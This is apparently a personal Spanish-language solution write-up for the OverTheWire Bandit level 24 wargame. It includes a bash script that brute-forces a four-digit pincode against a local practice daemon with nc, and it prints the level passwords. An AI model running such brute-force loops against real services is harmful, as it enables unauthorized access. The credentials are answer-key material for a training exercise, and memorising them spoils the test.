
## Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## data access
bandit24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar


## Solution

```

bandit24@bandit:~$ cd /tmp/
bandit24@bandit:/tmp$ ls
ls: cannot open directory '.': Permission denied
bandit24@bandit:/tmp$ cd /tmp/carpeta
bandit24@bandit:/tmp/carpeta$ ls
fuerzaBruta.sh  fuerzaburta.sh  listaCodigos.txt  listaConCodigos.txt  resultados.txt
bandit24@bandit:/tmp/carpeta$ wc -l resultados.txt
6302 resultados.txt
bandit24@bandit:/tmp/carpeta$ cat fuerzaBruta.sh
#!/bin/bash

for i in {0000..9999}
do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> listaConCodigos.txt
done

cat listaConCodigos.txt | nc localhost 30002 > resultados.txt
bandit24@bandit:/tmp/carpeta$ ./fuerzaBruta.sh
^C
bandit24@bandit:/tmp/carpeta$ ls
fuerzaBruta.sh  listaConCodigos.txt  resultados.txt
bandit24@bandit:/tmp/carpeta$ wc -l listaConCodigos.txt
10000 listaConCodigos.txt

bandit24@bandit:/tmp/carpeta$ split -l 5000 listaConCodigos.txt >> mitad.txt
bandit24@bandit:/tmp/carpeta$ ls
fuerzaBruta.sh  listaConCodigos.txt  mitad.txt  resultados.txt  xaa  xab
bandit24@bandit:/tmp/carpeta$ wc -l mitad.txt
0 mitad.txt
bandit24@bandit:/tmp/carpeta$ wc -l xaa
5000 xaa


bandit24@bandit:/tmp/carpeta$ ls
fuerzaBruta.sh  listaConCodigos.txt  mitad.txt  resultados.txt  xaa  xab
bandit24@bandit:/tmp/carpeta$ cat xaa | nc localhost 30002 > primeraMitad.txt
bandit24@bandit:/tmp/carpeta$ sort primeraMitad.txt | grep -v "Wrong!"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Timeout. Exiting.
bandit24@bandit:/tmp/carpeta$ cat xab | nc localhost 30002 > segundaMitad.txt
bandit24@bandit:/tmp/carpeta$ sort segundaMitad.txt | grep -v "Wrong!"

Correct!
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
bandit24@bandit:/tmp/carpeta$

```

## notes

primero se intento con el script inicial  pero se quedaba quieto y ya no dejaba de hacer nada mas que cuando le hacia ctrl c,pero se creaban documentos excepto por el de resultados que tenia menos lineas por lo que mejor decidi dividir las lineas con los codigos en 2 y ver si era el problema de mucho procesamiento y asi fue.

## references


